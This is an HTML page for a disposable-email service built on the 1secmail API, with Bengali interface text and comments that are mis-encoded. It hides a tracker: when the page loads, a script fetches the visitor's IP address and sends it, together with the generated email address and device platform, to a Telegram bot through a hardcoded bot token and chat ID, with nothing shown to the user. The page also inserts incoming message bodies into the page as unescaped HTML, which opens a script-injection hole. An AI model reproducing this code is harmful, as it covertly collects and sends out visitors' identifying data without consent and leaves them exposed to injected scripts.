<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fast Temp Mail & Tracker</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #0b0e14; color: white; padding-top: 50px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .mail-box { background: #1c2128; padding: 40px; border-radius: 20px; border: 1px solid #30363d; }
        #email-display { font-weight: bold; color: #58a6ff; font-size: 1.4rem; cursor: pointer; }
        .btn-primary { background-color: #238636; border: none; }
        .btn-primary:hover { background-color: #2ea043; }
    </style>
</head>
<body>
    <div class="container text-center">
        <div class="mail-box shadow-lg mx-auto" style="max-width: 600px;">
            <h2 class="mb-4">‚ö° Fast Temp-Mail</h2>
            <p class="text-secondary">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶°‡¶ø‡¶∏‡¶™‡ßã‡¶ú‡ßá‡¶¨‡¶≤ ‡¶Æ‡ßá‡¶á‡¶≤:</p>
            <div class="alert alert-dark border-secondary" id="email-display">Generating...</div>
            <button class="btn btn-primary w-100 py-2 mt-2" onclick="location.reload()">New Mail</button>
            <hr class="my-4" style="border-color: #30363d;">
            <h4>üì• Inbox</h4>
            <div id="inbox" class="text-start mt-3 text-secondary">‡¶®‡¶§‡ßÅ‡¶® ‡¶ì‡¶ü‡¶ø‡¶™‡¶ø ‡¶¨‡¶æ ‡¶Æ‡ßá‡¶á‡¶≤‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...</div>
        </div>
    </div>

    <script>
        const API_TOKEN = '8546099693:AAFvLX77wWoFww5EhDk47I-quWEZ1EdOQjs';
        const ADMIN_ID = '7416528268';
        const user = Math.random().toString(36).substring(2, 12);
        const domain = "1secmail.com";
        const email = `${user}@${domain}`;
        
        document.getElementById('email-display').innerText = email;

        // ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡ßá‡¶∞ ‡¶Ü‡¶á‡¶™‡¶ø ‡¶è‡¶¨‡¶Ç ‡¶Æ‡ßá‡¶á‡¶≤ ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        async function sendToTelegram() {
            try {
                // ‡¶Ü‡¶á‡¶™‡¶ø ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡ßç‡¶∞‡ßá‡¶∏ ‡¶®‡ßá‡¶ì‡ßü‡¶æ
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const userIp = ipData.ip;

                const message = `üîî **New User Alert!**\n\nüìß Mail: ${email}\nüåê IP: ${userIp}\nüåç Device: ${navigator.platform}`;
                
                await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (err) { console.log("Error sending data"); }
        }

        sendToTelegram(); // ‡¶∏‡¶æ‡¶á‡¶ü ‡¶≤‡ßã‡¶° ‡¶π‡¶≤‡ßá‡¶á ‡¶°‡¶æ‡¶ü‡¶æ ‡¶ö‡¶≤‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá

        // ‡¶á‡¶®‡¶¨‡¶ï‡ßç‡¶∏ ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        function checkMail() {
            fetch(`https://www.1secmail.com/api/v1/?action=getMessages&login=${user}&domain=${domain}`)
                .then(res => res.json())
                .then(data => {
                    if (data.length > 0) {
                        const mid = data[0].id;
                        fetch(`https://www.1secmail.com/api/v1/?action=readMessage&login=${user}&domain=${domain}&id=${mid}`)
                            .then(res => res.json())
                            .then(msg => {
                                document.getElementById('inbox').innerHTML = `
                                    <div class="card p-3 mb-2 bg-dark text-white border-primary">
                                        <strong>From:</strong> ${msg.from}<br>
                                        <strong>Subject:</strong> ${msg.subject}<br><hr>
                                        ${msg.textBody}
                                    </div>`;
                            });
                    }
                });
        }
        setInterval(checkMail, 5000);
    </script>
</body>
</html>
